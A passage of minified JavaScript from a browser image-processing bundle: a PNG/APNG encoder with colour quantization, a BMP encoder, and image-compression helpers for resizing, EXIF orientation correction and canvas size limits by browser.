          const e = 3 * y,
            n = t.plte[y],
            r = 255 & n,
            o = (n >>> 8) & 255,
            i = (n >>> 16) & 255;
          (b[d + e + 0] = r), (b[d + e + 1] = o), (b[d + e + 2] = i);
        }
        if (
          ((d += 3 * g), u(b, d, a(b, d - 3 * g - 4, 3 * g + 4)), (d += 4), p)
        ) {
          for (u(b, d, g), d += 4, l(b, d, "tRNS"), d += 4, y = 0; y < g; y++)
            b[d + y] = (t.plte[y] >>> 24) & 255;
          (d += g), u(b, d, a(b, d - g - 4, g + 4)), (d += 4);
        }
      }
      let A = 0;
      for (w = 0; w < t.frames.length; w++) {
        var k = t.frames[w];
        f &&
          (u(b, d, 26),
          (d += 4),
          l(b, d, "fcTL"),
          (d += 4),
          u(b, d, A++),
          (d += 4),
          u(b, d, k.rect.width),
          (d += 4),
          u(b, d, k.rect.height),
          (d += 4),
          u(b, d, k.rect.x),
          (d += 4),
          u(b, d, k.rect.y),
          (d += 4),
          c(b, d, i[w]),
          (d += 2),
          c(b, d, 1e3),
          (d += 2),
          (b[d] = k.dispose),
          d++,
          (b[d] = k.blend),
          d++,
          u(b, d, a(b, d - 30, 30)),
          (d += 4));
        const e = k.cimg;
        u(b, d, (g = e.length) + (0 == w ? 0 : 4)), (d += 4);
        const n = d;
        l(b, d, 0 == w ? "IDAT" : "fdAT"),
          (d += 4),
          0 != w && (u(b, d, A++), (d += 4)),
          b.set(e, d),
          (d += g),
          u(b, d, a(b, n, d - n)),
          (d += 4);
      }
      return (
        u(b, d, 0),
        (d += 4),
        l(b, d, "IEND"),
        (d += 4),
        u(b, d, a(b, d - 4, 4)),
        (d += 4),
        b.buffer
      );
    }
    function c(t, e, n) {
      for (let r = 0; r < t.frames.length; r++) {
        const o = t.frames[r];
        o.rect.width;
        const i = o.rect.height,
          s = new Uint8Array(i * o.bpl + i);
        o.cimg = h(o.img, i, o.bpp, o.bpl, s, e, n);
      }
    }
    function l(e, n, r, o, i) {
      const s = i[0],
        u = i[1],
        c = i[2],
        l = i[3],
        h = i[4],
        p = i[5];
      let g = 6,
        y = 8,
        w = 255;
      for (var b = 0; b < e.length; b++) {
        const t = new Uint8Array(e[b]);
        for (var v = t.length, A = 0; A < v; A += 4) w &= t[A + 3];
      }
      const k = 255 != w,
        I = (function (e, n, r, o, i, s) {
          const a = [];
          for (var u = 0; u < e.length; u++) {
            const d = new Uint8Array(e[u]),
              h = new Uint32Array(d.buffer);
            var c;
            let m = 0,
              g = 0,
              y = n,
              w = r,
              b = o ? 1 : 0;
            if (0 != u) {
              const v = s || o || 1 == u || 0 != a[u - 2].dispose ? 1 : 2;
              let A = 0,
                k = 1e9;
              for (let t = 0; t < v; t++) {
                var l = new Uint8Array(e[u - 1 - t]);
                const o = new Uint32Array(e[u - 1 - t]);
                let s = n,
                  a = r,
                  c = -1,
                  d = -1;
                for (let t = 0; t < r; t++)
                  for (let e = 0; e < n; e++)
                    h[(p = t * n + e)] != o[p] &&
                      (e < s && (s = e),
                      e > c && (c = e),
                      t < a && (a = t),
                      t > d && (d = t));
                -1 == c && (s = a = c = d = 0),
                  i && (!(1 & ~s) && s--, !(1 & ~a) && a--);
                const f = (c - s + 1) * (d - a + 1);
                f < k &&
                  ((k = f),
                  (A = t),
                  (m = s),
                  (g = a),
                  (y = c - s + 1),
                  (w = d - a + 1));
              }
              (l = new Uint8Array(e[u - 1 - A])),
                1 == A && (a[u - 1].dispose = 2),
                (c = new Uint8Array(y * w * 4)),
                t(l, n, r, c, y, w, -m, -g, 0),
                (b = t(d, n, r, c, y, w, -m, -g, 3) ? 1 : 0),
                1 == b
                  ? f(d, n, r, c, { x: m, y: g, width: y, height: w })
                  : t(d, n, r, c, y, w, -m, -g, 0);
            } else c = d.slice(0);
            a.push({
              rect: { x: m, y: g, width: y, height: w },
              img: c,
              blend: b,
              dispose: 0,
            });
          }
          if (o)
            for (u = 0; u < a.length; u++) {
              if (1 == (m = a[u]).blend) continue;
              const t = m.rect,
                o = a[u - 1].rect,
                s = Math.min(t.x, o.x),
                c = Math.min(t.y, o.y),
                l = {
                  x: s,
                  y: c,
                  width: Math.max(t.x + t.width, o.x + o.width) - s,
                  height: Math.max(t.y + t.height, o.y + o.height) - c,
                };
              (a[u - 1].dispose = 1),
                u - 1 != 0 && d(e, n, r, a, u - 1, l, i),
                d(e, n, r, a, u, l, i);
            }
          let h = 0;
          if (1 != e.length)
            for (var p = 0; p < a.length; p++) {
              var m;
              h += (m = a[p]).rect.width * m.rect.height;
            }
          return a;
        })(e, n, r, s, u, c),
        S = {},
        _ = [],
        T = [];
      if (0 != o) {
        const t = [];
        for (A = 0; A < I.length; A++) t.push(I[A].img.buffer);
        const e = m(
          (function (t) {
            let e = 0;
            for (var n = 0; n < t.length; n++) e += t[n].byteLength;
            const r = new Uint8Array(e);
            let o = 0;
            for (n = 0; n < t.length; n++) {
              const e = new Uint8Array(t[n]),
                i = e.length;
              for (let t = 0; t < i; t += 4) {
                let n = e[t],
                  i = e[t + 1],
                  s = e[t + 2];
                const a = e[t + 3];
                0 == a && (n = i = s = 0),
                  (r[o + t] = n),
                  (r[o + t + 1] = i),
                  (r[o + t + 2] = s),
                  (r[o + t + 3] = a);
              }
              o += i;
            }
            return r.buffer;
          })(t),
          o
        );
        for (A = 0; A < e.plte.length; A++) _.push(e.plte[A].est.rgba);
        let n = 0;
        for (A = 0; A < I.length; A++) {
          const t = (B = I[A]).img.length;
          var C = new Uint8Array(e.inds.buffer, n >> 2, t >> 2);
          T.push(C);
          const r = new Uint8Array(e.abuf, n, t);
          p && a(B.img, B.rect.width, B.rect.height, _, r, C),
            B.img.set(r),
            (n += t);
        }
      } else
        for (b = 0; b < I.length; b++) {
          var B = I[b];
          const t = new Uint32Array(B.img.buffer);
          var E = B.rect.width;
          for (
            v = t.length, C = new Uint8Array(v), T.push(C), A = 0;
            A < v;
            A++
          ) {
            const e = t[A];
            if (0 != A && e == t[A - 1]) C[A] = C[A - 1];
            else if (A > E && e == t[A - E]) C[A] = C[A - E];
            else {
              let t = S[e];
              if (
                null == t &&
                ((S[e] = t = _.length), _.push(e), _.length >= 300)
              )
                break;
              C[A] = t;
            }
          }
        }
      const x = _.length;
      for (
        x <= 256 &&
          0 == h &&
          ((y = x <= 2 ? 1 : x <= 4 ? 2 : x <= 16 ? 4 : 8),
          (y = Math.max(y, l))),
          b = 0;
        b < I.length;
        b++
      ) {
        (B = I[b]).rect.x, B.rect.y, (E = B.rect.width);
        const t = B.rect.height;
        let e = B.img;
        new Uint32Array(e.buffer);
        let n = 4 * E,
          r = 4;
        if (x <= 256 && 0 == h) {
          n = Math.ceil((y * E) / 8);
          var P = new Uint8Array(n * t);
          const o = T[b];
          for (let e = 0; e < t; e++) {
            A = e * n;
            const t = e * E;
            if (8 == y) for (var R = 0; R < E; R++) P[A + R] = o[t + R];
            else if (4 == y)
              for (R = 0; R < E; R++)
                P[A + (R >> 1)] |= o[t + R] << (4 - 4 * (1 & R));
            else if (2 == y)
              for (R = 0; R < E; R++)
                P[A + (R >> 2)] |= o[t + R] << (6 - 2 * (3 & R));
            else if (1 == y)
              for (R = 0; R < E; R++)
                P[A + (R >> 3)] |= o[t + R] << (7 - 1 * (7 & R));
          }
          (e = P), (g = 3), (r = 1);
        } else if (0 == k && 1 == I.length) {
          P = new Uint8Array(E * t * 3);
          const o = E * t;
          for (A = 0; A < o; A++) {
            const t = 3 * A,
              n = 4 * A;
            (P[t] = e[n]), (P[t + 1] = e[n + 1]), (P[t + 2] = e[n + 2]);
          }
          (e = P), (g = 2), (r = 3), (n = 3 * E);
        }
        (B.img = e), (B.bpl = n), (B.bpp = r);
      }
      return { ctype: g, depth: y, plte: _, frames: I };
    }
    function d(e, n, r, o, i, s, a) {
      const u = Uint8Array,
        c = Uint32Array,
        l = new u(e[i - 1]),
        d = new c(e[i - 1]),
        h = i + 1 < e.length ? new u(e[i + 1]) : null,
        p = new u(e[i]),
        m = new c(p.buffer);
      let g = n,
        y = r,
        w = -1,
        b = -1;
      for (let t = 0; t < s.height; t++)
        for (let e = 0; e < s.width; e++) {
          const r = s.x + e,
            a = s.y + t,
            u = a * n + r,
            c = m[u];
          0 == c ||
            (0 == o[i - 1].dispose &&
              d[u] == c &&
              (null == h || 0 != h[4 * u + 3])) ||
            (r < g && (g = r),
            r > w && (w = r),
            a < y && (y = a),
            a > b && (b = a));
        }
      -1 == w && (g = y = w = b = 0),
        a && (!(1 & ~g) && g--, !(1 & ~y) && y--),
        (s = { x: g, y: y, width: w - g + 1, height: b - y + 1 });
      const v = o[i];
      (v.rect = s),
        (v.blend = 1),
        (v.img = new Uint8Array(s.width * s.height * 4)),
        0 == o[i - 1].dispose
          ? (t(l, n, r, v.img, s.width, s.height, -s.x, -s.y, 0),
            f(p, n, r, v.img, s))
          : t(p, n, r, v.img, s.width, s.height, -s.x, -s.y, 0);
    }
    function f(e, n, r, o, i) {
      t(e, n, r, o, i.width, i.height, -i.x, -i.y, 2);
    }
    function h(t, e, n, r, o, i, s) {
      const a = [];
      let u,
        c = [0, 1, 2, 3, 4];
      -1 != i ? (c = [i]) : (e * r > 5e5 || 1 == n) && (c = [0]),
        s && (u = { level: 0 });
      const l = $P;
      for (var d = 0; d < c.length; d++) {
        for (let i = 0; i < e; i++) p(o, t, i, r, n, c[d]);
        a.push(l.deflate(o, u));
      }
      let f,
        h = 1e9;
      for (d = 0; d < a.length; d++)
        a[d].length < h && ((f = d), (h = a[d].length));
      return a[f];
    }
    function p(t, e, r, o, i, s) {
      const a = r * o;
      let u = a + r;
      if (((t[u] = s), u++, 0 == s))
        if (o < 500) for (var c = 0; c < o; c++) t[u + c] = e[a + c];
        else t.set(new Uint8Array(e.buffer, a, o), u);
      else if (1 == s) {
        for (c = 0; c < i; c++) t[u + c] = e[a + c];
        for (c = i; c < o; c++)
          t[u + c] = (e[a + c] - e[a + c - i] + 256) & 255;
      } else if (0 == r) {
        for (c = 0; c < i; c++) t[u + c] = e[a + c];
        if (2 == s) for (c = i; c < o; c++) t[u + c] = e[a + c];
        if (3 == s)
          for (c = i; c < o; c++)
            t[u + c] = (e[a + c] - (e[a + c - i] >> 1) + 256) & 255;
        if (4 == s)
          for (c = i; c < o; c++)
            t[u + c] = (e[a + c] - n(e[a + c - i], 0, 0) + 256) & 255;
      } else {
        if (2 == s)
          for (c = 0; c < o; c++)
            t[u + c] = (e[a + c] + 256 - e[a + c - o]) & 255;
        if (3 == s) {
          for (c = 0; c < i; c++)
            t[u + c] = (e[a + c] + 256 - (e[a + c - o] >> 1)) & 255;
          for (c = i; c < o; c++)
            t[u + c] =
              (e[a + c] + 256 - ((e[a + c - o] + e[a + c - i]) >> 1)) & 255;
        }
        if (4 == s) {
          for (c = 0; c < i; c++)
            t[u + c] = (e[a + c] + 256 - n(0, e[a + c - o], 0)) & 255;
          for (c = i; c < o; c++)
            t[u + c] =
              (e[a + c] +
                256 -
                n(e[a + c - i], e[a + c - o], e[a + c - i - o])) &
              255;
        }
      }
    }
    function m(t, e) {
      const n = new Uint8Array(t),
        r = n.slice(0),
        o = new Uint32Array(r.buffer),
        i = g(r, e),
        s = i[0],
        a = i[1],
        u = n.length,
        c = new Uint8Array(u >> 2);
      let l;
      if (n.length < 2e7)
        for (var d = 0; d < u; d += 4)
          (l = y(
            s,
            (f = n[d] * (1 / 255)),
            (h = n[d + 1] * (1 / 255)),
            (p = n[d + 2] * (1 / 255)),
            (m = n[d + 3] * (1 / 255))
          )),
            (c[d >> 2] = l.ind),
            (o[d >> 2] = l.est.rgba);
      else
        for (d = 0; d < u; d += 4) {
          var f = n[d] * (1 / 255),
            h = n[d + 1] * (1 / 255),
            p = n[d + 2] * (1 / 255),
            m = n[d + 3] * (1 / 255);
          for (l = s; l.left; )
            l = w(l.est, f, h, p, m) <= 0 ? l.left : l.right;
          (c[d >> 2] = l.ind), (o[d >> 2] = l.est.rgba);
        }
      return { abuf: r.buffer, inds: c, plte: a };
    }
    function g(t, e, n) {
      null == n && (n = 1e-4);
      const r = new Uint32Array(t.buffer),
        o = {
          i0: 0,
          i1: t.length,
          bst: null,
          est: null,
          tdst: 0,
          left: null,
          right: null,
        };
      (o.bst = A(t, o.i0, o.i1)), (o.est = k(o.bst));
      const i = [o];
      for (; i.length < e; ) {
        let e = 0,
          o = 0;
        for (var s = 0; s < i.length; s++)
          i[s].est.L > e && ((e = i[s].est.L), (o = s));
        if (e < n) break;
        const a = i[o],
          u = b(t, r, a.i0, a.i1, a.est.e, a.est.eMq255);
        if (a.i0 >= u || a.i1 <= u) {
          a.est.L = 0;
          continue;
        }
        const c = {
          i0: a.i0,
          i1: u,
          bst: null,
          est: null,
          tdst: 0,
          left: null,
          right: null,
        };
        (c.bst = A(t, c.i0, c.i1)), (c.est = k(c.bst));
        const l = {
          i0: u,
          i1: a.i1,
          bst: null,
          est: null,
          tdst: 0,
          left: null,
          right: null,
        };
        for (l.bst = { R: [], m: [], N: a.bst.N - c.bst.N }, s = 0; s < 16; s++)
          l.bst.R[s] = a.bst.R[s] - c.bst.R[s];
        for (s = 0; s < 4; s++) l.bst.m[s] = a.bst.m[s] - c.bst.m[s];
        (l.est = k(l.bst)), (a.left = c), (a.right = l), (i[o] = c), i.push(l);
      }
      for (i.sort((t, e) => e.bst.N - t.bst.N), s = 0; s < i.length; s++)
        i[s].ind = s;
      return [o, i];
    }
    function y(t, e, n, r, o) {
      if (null == t.left)
        return (
          (t.tdst = (function (t, e, n, r, o) {
            const i = e - t[0],
              s = n - t[1],
              a = r - t[2],
              u = o - t[3];
            return i * i + s * s + a * a + u * u;
          })(t.est.q, e, n, r, o)),
          t
        );
      const i = w(t.est, e, n, r, o);
      let s = t.left,
        a = t.right;
      i > 0 && ((s = t.right), (a = t.left));
      const u = y(s, e, n, r, o);
      if (u.tdst <= i * i) return u;
      const c = y(a, e, n, r, o);
      return c.tdst < u.tdst ? c : u;
    }
    function w(t, e, n, r, o) {
      const { e: i } = t;
      return i[0] * e + i[1] * n + i[2] * r + i[3] * o - t.eMq;
    }
    function b(t, e, n, r, o, i) {
      for (r -= 4; n < r; ) {
        for (; v(t, n, o) <= i; ) n += 4;
        for (; v(t, r, o) > i; ) r -= 4;
        if (n >= r) break;
        const s = e[n >> 2];
        (e[n >> 2] = e[r >> 2]), (e[r >> 2] = s), (n += 4), (r -= 4);
      }
      for (; v(t, n, o) > i; ) n -= 4;
      return n + 4;
    }
    function v(t, e, n) {
      return t[e] * n[0] + t[e + 1] * n[1] + t[e + 2] * n[2] + t[e + 3] * n[3];
    }
    function A(t, e, n) {
      const r = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        o = [0, 0, 0, 0],
        i = (n - e) >> 2;
      for (let s = e; s < n; s += 4) {
        const e = t[s] * (1 / 255),
          n = t[s + 1] * (1 / 255),
          i = t[s + 2] * (1 / 255),
          a = t[s + 3] * (1 / 255);
        (o[0] += e),
          (o[1] += n),
          (o[2] += i),
          (o[3] += a),
          (r[0] += e * e),
          (r[1] += e * n),
          (r[2] += e * i),
          (r[3] += e * a),
          (r[5] += n * n),
          (r[6] += n * i),
          (r[7] += n * a),
          (r[10] += i * i),
          (r[11] += i * a),
          (r[15] += a * a);
      }
      return (
        (r[4] = r[1]),
        (r[8] = r[2]),
        (r[9] = r[6]),
        (r[12] = r[3]),
        (r[13] = r[7]),
        (r[14] = r[11]),
        { R: r, m: o, N: i }
      );
    }
    function k(t) {
      const { R: e } = t,
        { m: n } = t,
        { N: r } = t,
        o = n[0],
        i = n[1],
        s = n[2],
        a = n[3],
        u = 0 == r ? 0 : 1 / r,
        c = [
          e[0] - o * o * u,
          e[1] - o * i * u,
          e[2] - o * s * u,
          e[3] - o * a * u,
          e[4] - i * o * u,
          e[5] - i * i * u,
          e[6] - i * s * u,
          e[7] - i * a * u,
          e[8] - s * o * u,
          e[9] - s * i * u,
          e[10] - s * s * u,
          e[11] - s * a * u,
          e[12] - a * o * u,
          e[13] - a * i * u,
          e[14] - a * s * u,
          e[15] - a * a * u,
        ],
        l = c,
        d = I;
      let f = [Math.random(), Math.random(), Math.random(), Math.random()],
        h = 0,
        p = 0;
      if (0 != r)
        for (
          let g = 0;
          g < 16 &&
          ((f = d.multVec(l, f)),
          (p = Math.sqrt(d.dot(f, f))),
          (f = d.sml(1 / p, f)),
          !(0 != g && Math.abs(p - h) < 1e-9));
          g++
        )
          h = p;
      const m = [o * u, i * u, s * u, a * u];
      return {
        Cov: c,
        q: m,
        e: f,
        L: h,
        eMq255: d.dot(d.sml(255, m), f),
        eMq: d.dot(f, m),
        rgba:
          ((Math.round(255 * m[3]) << 24) |
            (Math.round(255 * m[2]) << 16) |
            (Math.round(255 * m[1]) << 8) |
            Math.round(255 * m[0])) >>>
          0,
      };
    }
    var I = {
      multVec: (t, e) => [
        t[0] * e[0] + t[1] * e[1] + t[2] * e[2] + t[3] * e[3],
        t[4] * e[0] + t[5] * e[1] + t[6] * e[2] + t[7] * e[3],
        t[8] * e[0] + t[9] * e[1] + t[10] * e[2] + t[11] * e[3],
        t[12] * e[0] + t[13] * e[1] + t[14] * e[2] + t[15] * e[3],
      ],
      dot: (t, e) => t[0] * e[0] + t[1] * e[1] + t[2] * e[2] + t[3] * e[3],
      sml: (t, e) => [t * e[0], t * e[1], t * e[2], t * e[3]],
    };
    (tR.encode = function (t, e, n, r, o, i, s) {
      null == r && (r = 0), null == s && (s = !1);
      const a = l(t, e, n, r, [!1, !1, !1, 0, s, !1]);
      return c(a, -1), u(a, e, n, o, i);
    }),
      (tR.encodeLL = function (t, e, n, r, o, i, s, a) {
        const l = {
            ctype: 0 + (1 == r ? 0 : 2) + (0 == o ? 0 : 4),
            depth: i,
            frames: [],
          },
          d = (r + o) * i,
          f = d * e;
        for (let u = 0; u < t.length; u++)
          l.frames.push({
            rect: { x: 0, y: 0, width: e, height: n },
            img: new Uint8Array(t[u]),
            blend: 0,
            dispose: 1,
            bpp: Math.ceil(d / 8),
            bpl: Math.ceil(f / 8),
          });
        return c(l, 0, !0), u(l, e, n, s, a);
      }),
      (tR.encode.compress = l),
      (tR.encode.dither = a),
      (tR.quantize = m),
      (tR.quantize.getKDtree = g),
      (tR.quantize.getNearest = y);
  })();
  const eR = {
    toArrayBuffer(t, e) {
      const n = t.width,
        r = t.height,
        o = n << 2,
        i = t.getContext("2d").getImageData(0, 0, n, r),
        s = new Uint32Array(i.data.buffer),
        a = ((32 * n + 31) / 32) << 2,
        u = a * r,
        c = 122 + u,
        l = new ArrayBuffer(c),
        d = new DataView(l),
        f = 1 << 20;
      let h,
        p,
        m,
        g,
        y = f,
        w = 0,
        b = 0,
        v = 0;
      function A(t) {
        d.setUint16(b, t, !0), (b += 2);
      }
      function k(t) {
        d.setUint32(b, t, !0), (b += 4);
      }
      function I(t) {
        b += t;
      }
      A(19778),
        k(c),
        I(4),
        k(122),
        k(108),
        k(n),
        k(-r >>> 0),
        A(1),
        A(32),
        k(3),
        k(u),
        k(2835),
        k(2835),
        I(8),
        k(16711680),
        k(65280),
        k(255),
        k(4278190080),
        k(1466527264),
        (function t() {
          for (; w < r && y > 0; ) {
            for (g = 122 + w * a, h = 0; h < o; )
              y--,
                (p = s[v++]),
                (m = p >>> 24),
                d.setUint32(g + h, (p << 8) | m),
                (h += 4);
            w++;
          }
          v < s.length ? ((y = f), setTimeout(t, eR._dly)) : e(l);
        })();
    },
    toBlob(t, e) {
      this.toArrayBuffer(t, (t) => {
        e(new Blob([t], { type: "image/bmp" }));
      });
    },
    _dly: 9,
  };
  var nR = {
      CHROME: "CHROME",
      FIREFOX: "FIREFOX",
      DESKTOP_SAFARI: "DESKTOP_SAFARI",
      IE: "IE",
      IOS: "IOS",
      ETC: "ETC",
    },
    rR = {
      [nR.CHROME]: 16384,
      [nR.FIREFOX]: 11180,
      [nR.DESKTOP_SAFARI]: 16384,
      [nR.IE]: 8192,
      [nR.IOS]: 4096,
      [nR.ETC]: 8192,
    };
  const oR = "undefined" != typeof window,
    iR =
      "undefined" != typeof WorkerGlobalScope &&
      self instanceof WorkerGlobalScope,
    sR =
      oR &&
      window.cordova &&
      window.cordova.require &&
      window.cordova.require("cordova/modulemapper"),
    aR =
      (oR || iR) &&
      ((sR && sR.getOriginalSymbol(window, "File")) ||
        ("undefined" != typeof File && File)),
    uR =
      (oR || iR) &&
      ((sR && sR.getOriginalSymbol(window, "FileReader")) ||
        ("undefined" != typeof FileReader && FileReader));
  function cR(t, e, n = Date.now()) {
    return new Promise((r) => {
      const o = t.split(","),
        i = o[0].match(/:(.*?);/)[1],
        s = globalThis.atob(o[1]);
      let a = s.length;
      const u = new Uint8Array(a);
      for (; a--; ) u[a] = s.charCodeAt(a);
      const c = new Blob([u], { type: i });
      (c.name = e), (c.lastModified = n), r(c);
    });
  }
  function lR(t) {
    return new Promise((e, n) => {
      const r = new uR();
      (r.onload = () => e(r.result)),
        (r.onerror = (t) => n(t)),
        r.readAsDataURL(t);
    });
  }
  function dR(t) {
    return new Promise((e, n) => {
      const r = new Image();
      (r.onload = () => e(r)), (r.onerror = (t) => n(t)), (r.src = t);
    });
  }
  function fR() {
    if (void 0 !== fR.cachedResult) return fR.cachedResult;
    let t = nR.ETC;
    const { userAgent: e } = navigator;
    return (
      /Chrom(e|ium)/i.test(e)
        ? (t = nR.CHROME)
        : /iP(ad|od|hone)/i.test(e) && /WebKit/i.test(e)
        ? (t = nR.IOS)
        : /Safari/i.test(e)
        ? (t = nR.DESKTOP_SAFARI)
        : /Firefox/i.test(e)
        ? (t = nR.FIREFOX)
        : (/MSIE/i.test(e) || 1 == !!document.documentMode) && (t = nR.IE),
      (fR.cachedResult = t),
      fR.cachedResult
    );
  }
  function hR(t, e) {
    const n = fR(),
      r = rR[n];
    let o = t,
      i = e,
      s = o * i;
    const a = o > i ? i / o : o / i;
    for (; s > r * r; ) {
      const t = (r + o) / 2,
        e = (r + i) / 2;
      t < e ? ((i = e), (o = e * a)) : ((i = t * a), (o = t)), (s = o * i);
    }
    return { width: o, height: i };
  }
  function pR(t, e) {
    let n, r;
    try {
      if (
        ((n = new OffscreenCanvas(t, e)), (r = n.getContext("2d")), null === r)
      )
        throw new Error("getContext of OffscreenCanvas returns null");
    } catch (o) {
      (n = document.createElement("canvas")), (r = n.getContext("2d"));
    }
    return (n.width = t), (n.height = e), [n, r];
  }
  function mR(t, e) {
    const { width: n, height: r } = hR(t.width, t.height),
      [o, i] = pR(n, r);
    return (
      e &&
        /jpe?g/.test(e) &&
        ((i.fillStyle = "white"), i.fillRect(0, 0, o.width, o.height)),
      i.drawImage(t, 0, 0, o.width, o.height),
      o
    );
  }
  function gR() {
    return (
      void 0 !== gR.cachedResult ||
        (gR.cachedResult =
          [
            "iPad Simulator",
            "iPhone Simulator",
            "iPod Simulator",
            "iPad",
            "iPhone",
            "iPod",
          ].includes(navigator.platform) ||
          (navigator.userAgent.includes("Mac") &&
            "undefined" != typeof document &&
            "ontouchend" in document)),
      gR.cachedResult
    );
  }
  function yR(t, e = {}) {
    return new Promise(function (n, r) {
      let o, i;
      var s = function () {
          try {
            return (i = mR(o, e.fileType || t.type)), n([o, i]);
          } catch (s) {
            return r(s);
          }
        },
        a = function (e) {
          try {
            var n = function (t) {
              try {
                throw t;
              } catch (e) {
                return r(e);
              }
            };
            try {
              let e;
              return lR(t).then(function (t) {
                try {
                  return (
                    (e = t),
                    dR(e).then(function (t) {
                      try {
                        return (
                          (o = t),
                          (function () {
                            try {
                              return s();
                            } catch (t) {
                              return r(t);
                            }
                          })()
                        );
                      } catch (e) {
                        return n(e);
                      }
                    }, n)
                  );
                } catch (i) {
                  return n(i);
                }
              }, n);
            } catch (i) {
              n(i);
            }
          } catch (i) {
            return r(i);
          }
        };
      try {
        if (gR() || [nR.DESKTOP_SAFARI, nR.MOBILE_SAFARI].includes(fR()))
          throw new Error("Skip createImageBitmap on IOS and Safari");
        return createImageBitmap(t).then(function (t) {
          try {
            return (o = t), s();
          } catch (e) {
            return a();
          }
        }, a);
      } catch (u) {
        a();
      }
    });
  }
  function wR(t, e, n, r, o = 1) {
    return new Promise(function (i, s) {
      let a;
      if ("image/png" === e) {
        let i, s, c;
        return (
          (i = t.getContext("2d")),
          ({ data: s } = i.getImageData(0, 0, t.width, t.height)),
          (c = tR.encode([s.buffer], t.width, t.height, 4096 * o)),
          (a = new Blob([c], { type: e })),
          (a.name = n),
          (a.lastModified = r),
          u.call(this)
        );
      }
      {
        let i = function () {
          return u.call(this);
        };
        if ("image/bmp" === e)
          return new Promise((e) => eR.toBlob(t, e)).then(
            function (t) {
              try {
                return (
                  (a = t), (a.name = n), (a.lastModified = r), i.call(this)
                );
              } catch (e) {
                return s(e);
              }
            }.bind(this),
            s
          );
        {
          let u = function () {
            return i.call(this);
          };
          if (
            "function" == typeof OffscreenCanvas &&
            t instanceof OffscreenCanvas
          )
            return t.convertToBlob({ type: e, quality: o }).then(
              function (t) {
                try {
                  return (
                    (a = t), (a.name = n), (a.lastModified = r), u.call(this)
                  );
                } catch (e) {
                  return s(e);
                }
              }.bind(this),
              s
            );
          {
            let i;
            return (
              (i = t.toDataURL(e, o)),
              cR(i, n, r).then(
                function (t) {
                  try {
                    return (a = t), u.call(this);
                  } catch (e) {
                    return s(e);
                  }
                }.bind(this),
                s
              )
            );
          }
        }
      }
      function u() {
        return i(a);
      }
    });
  }
  function bR(t) {
    (t.width = 0), (t.height = 0);
  }
  function vR() {
    return new Promise(function (t, e) {
      let n, r, o, i;
      return void 0 !== vR.cachedResult
        ? t(vR.cachedResult)
        : cR(
            "data:image/jpeg;base64,/9j/4QAiRXhpZgAATU0AKgAAAAgAAQESAAMAAAABAAYAAAAAAAD/2wCEAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAf/AABEIAAEAAgMBEQACEQEDEQH/xABKAAEAAAAAAAAAAAAAAAAAAAALEAEAAAAAAAAAAAAAAAAAAAAAAQEAAAAAAAAAAAAAAAAAAAAAEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwA/8H//2Q==",
            "test.jpg",
            Date.now()
          ).then(function (s) {
            try {
              return (
                (n = s),
                yR(n).then(function (s) {
                  try {
                    return (
                      (r = s[1]),
                      wR(r, n.type, n.name, n.lastModified).then(function (n) {
                        try {
                          return (
                            (o = n),
                            bR(r),
                            yR(o).then(function (n) {
                              try {
                                return (
                                  (i = n[0]),
                                  (vR.cachedResult =
                                    1 === i.width && 2 === i.height),
                                  t(vR.cachedResult)
                                );
                              } catch (r) {
                                return e(r);
                              }
                            }, e)
                          );
                        } catch (s) {
                          return e(s);
                        }
                      }, e)
                    );
                  } catch (a) {
                    return e(a);
                  }
                }, e)
              );
            } catch (a) {
              return e(a);
            }
          }, e);
    });
  }
  function AR(t) {
    return new Promise((e, n) => {
      const r = new uR();
      (r.onload = (t) => {
        const n = new DataView(t.target.result);
        if (65496 != n.getUint16(0, !1)) return e(-2);
        const r = n.byteLength;
        let o = 2;
        for (; o < r; ) {
          if (n.getUint16(o + 2, !1) <= 8) return e(-1);
          const t = n.getUint16(o, !1);
          if (((o += 2), 65505 == t)) {
            if (1165519206 != n.getUint32((o += 2), !1)) return e(-1);
            const t = 18761 == n.getUint16((o += 6), !1);
            o += n.getUint32(o + 4, t);
            const r = n.getUint16(o, t);
            o += 2;
            for (let i = 0; i < r; i++)
              if (274 == n.getUint16(o + 12 * i, t))
                return e(n.getUint16(o + 12 * i + 8, t));
          } else {
            if (65280 & ~t) break;
            o += n.getUint16(o, !1);
          }
        }
        return e(-1);
      }),
        (r.onerror = (t) => n(t)),
        r.readAsArrayBuffer(t);
    });
  }
  function kR(t, e) {
    const { width: n } = t,
      { height: r } = t,
      { maxWidthOrHeight: o } = e;
    let i,
      s = t;
    return (
      isFinite(o) &&
        (n > o || r > o) &&
        (([s, i] = pR(n, r)),
        n > r
          ? ((s.width = o), (s.height = (r / n) * o))
          : ((s.width = (n / r) * o), (s.height = o)),
        i.drawImage(t, 0, 0, s.width, s.height),
        bR(t)),
      s
    );
  }
  function IR(t, e) {
    const { width: n } = t,
      { height: r } = t,
      [o, i] = pR(n, r);
    switch (
      (e > 4 && e < 9
        ? ((o.width = r), (o.height = n))
        : ((o.width = n), (o.height = r)),
      e)
    ) {
      case 2:
        i.transform(-1, 0, 0, 1, n, 0);
        break;
      case 3:
        i.transform(-1, 0, 0, -1, n, r);
        break;
      case 4:
        i.transform(1, 0, 0, -1, 0, r);
        break;
      case 5:
        i.transform(0, 1, 1, 0, 0, 0);
        break;
      case 6:
        i.transform(0, 1, -1, 0, r, 0);
        break;
      case 7:
        i.transform(0, -1, -1, 0, r, n);
        break;
      case 8:
        i.transform(0, -1, 1, 0, 0, n);
    }
    return i.drawImage(t, 0, 0, n, r), bR(t), o;
  }
  function SR(t, e, n = 0) {
    return new Promise(function (r, o) {
      let i, s, a, u, c, l, d, f, h, p, m, g, y, w, b, v, A, k, I, S;
      function _(t = 5) {
        if (e.signal && e.signal.aborted) throw e.signal.reason;
        (i += t), e.onProgress(Math.min(i, 100));
      }
      function T(t) {
        if (e.signal && e.signal.aborted) throw e.signal.reason;
        (i = Math.min(Math.max(t, i), 100)), e.onProgress(i);
      }
      return (
        (i = n),
        (s = e.maxIteration || 10),
        (a = 1024 * e.maxSizeMB * 1024),
        _(),
        yR(t, e).then(
          function (n) {
            try {
              return (
                ([, u] = n),
                _(),
                (c = kR(u, e)),
                _(),
